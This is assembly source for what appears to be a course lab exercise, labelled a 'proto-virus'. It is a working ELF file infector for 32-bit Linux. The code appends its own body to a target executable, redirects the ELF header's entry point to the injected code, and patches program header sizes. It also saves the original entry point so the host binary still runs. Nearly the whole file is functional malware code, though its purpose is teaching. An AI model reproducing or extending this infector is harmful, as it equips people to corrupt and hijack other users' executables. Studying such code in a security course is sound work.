%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro


%macro getAddressOf 1
	call getPivot				
	add eax, %1 - pivot		
%endmacro

%define STDOUT 1
%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_CUR 1
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define EHDR_size 52
;;stack position of data
%define POS_PHDR 96 
%define POS_ORIG_ENTRY_POINT 64
%define POS_FILE_IN_MEM 60
%define POS_FILE_SIZE 8
%define POS_FD 4
%define POS_TEMP2 192
%define POS_TEMP 196
	
	global _start

	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


	getAddressOf OutStr
	write STDOUT, eax, 31			;print the OutStr

	getAddressOf FileName
	open eax, RDWR, 0777			;open for RW, create if needed
	mov dword[ebp - POS_FD], eax	;eax holds file dirent, non-negative -> file opened successfully, 
	cmp eax, -26					;-26 -> we are already in file
	jz ifInsideFile
	cmp eax, 0
	jl ifFileNotOpened

	ifFileWasOpened:		;check that its an elf file...
		mov eax, ebp
		sub eax, POS_TEMP		;eax = adrs of temp

		read dword [ebp - POS_FD], eax, 4		;put first 4 bytes of file in TEMP
		cmp dword [ebp - POS_TEMP], 0x464C457F	;check that fist 4 bytes = ".ELF" (in Little Endian)
		jnz ifFileNotOpened

		lseek dword [ebp - POS_FD], 0, SEEK_END	;seek to end of file, eax holds num bytes in file
		mov dword[ebp - POS_FILE_SIZE], eax		;fileSize = num bytes in file

		getAddressOf virus_end
		mov ebx, eax
		getAddressOf _start						;eax holds adrs of start
		sub ebx, eax 							;ebx holds size of virus
		write dword [ebp - POS_FD], eax, ebx	;write virus to file (position is at end still^^)

		lseek dword [ebp - POS_FD], 0, SEEK_SET	;rewind to begining of file
		mov eax, ebp
		sub eax, POS_FILE_IN_MEM

		read dword [ebp - POS_FD], eax, EHDR_size	;read ElfHdr
		mov eax, [ebp - POS_FILE_IN_MEM + ENTRY]	;eax = original entry point
		mov dword[ebp - POS_ORIG_ENTRY_POINT],  eax ; save the previous entry point

		mov eax, [ebp - POS_FILE_IN_MEM + PHDR_start]	;eax holds offset to first Phdr
		add eax, PHDR_size 								;eax holds offset to second Phdr
		lseek dword [ebp - POS_FD], eax, SEEK_SET		;seek to second Phdr offset in file
		mov eax, ebp
		sub eax, POS_PHDR								;eax holds pointer Phdr buffer

		read dword [ebp - POS_FD], eax, PHDR_size		;read the PHdr from file to phdr buffer
		mov eax, [ebp - POS_PHDR + PHDR_vaddr]			
		sub eax, [ebp - POS_PHDR + PHDR_offset]
		add eax, [ebp - POS_FILE_SIZE]					;eax holds new entry point
		mov dword[ebp - POS_FILE_IN_MEM + ENTRY], eax	;change entry point in FileInMemory
		lseek dword [ebp - POS_FD], 0, SEEK_SET			;rewind file
		mov eax, ebp
		sub eax, POS_FILE_IN_MEM						;eax holds adrress of EHdr/FileInMemory
		write dword [ebp - POS_FD], eax, EHDR_size		;write the alterred EHdr back to file
		
		getAddressOf virus_end
		mov ebx, eax
		getAddressOf _start
		sub ebx, eax									;ebx = size of virus
		mov eax, [ebp - POS_FILE_SIZE]					
		sub eax, [ebp - POS_PHDR + PHDR_offset]	
		add eax, ebx									;eax = new size of file
		mov dword[ebp - POS_PHDR + PHDR_memsize], eax	;update memSize
		mov dword[ebp - POS_PHDR + PHDR_filesize], eax	;update fildeSize

		mov eax, [ebp - POS_FILE_IN_MEM + PHDR_start]
		add eax, PHDR_size								;eax holds offset of 2nd PHdr
		lseek dword [ebp - POS_FD], eax, SEEK_SET		;seek to 2nd PHdr in file

		mov eax, ebp
		sub eax, POS_PHDR								;eax holds PHdr buffer
		write dword [ebp - POS_FD], eax, PHDR_size		;write the PHdr back to the file

		lseek dword [ebp - POS_FD], -4, SEEK_END		;seek to last dword of file
		mov eax, ebp
		sub eax, POS_ORIG_ENTRY_POINT					;eax = original entry point

		write dword [ebp - POS_FD], eax, 4		;write the original entry point to end of infected file
		close dword [ebp - POS_FD]				;close the file
		mov esp, ebp							;restore stack pointer
		pop ebp									;restore stack state
	ifInsideFile:
		getAddressOf PreviousEntryPoint
		jmp [eax]
	ifFileNotOpened:
		getAddressOf Failstr
		write STDOUT, eax, 12
		exit 1
VirusExit:
    exit 0           	; Termination if all is OK and no previous code to jump to
                        ; (also an example for use of above macros)
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
getPivot:
	call pivot
pivot:
	pop eax
	ret
PreviousEntryPoint: dd VirusExit
virus_end: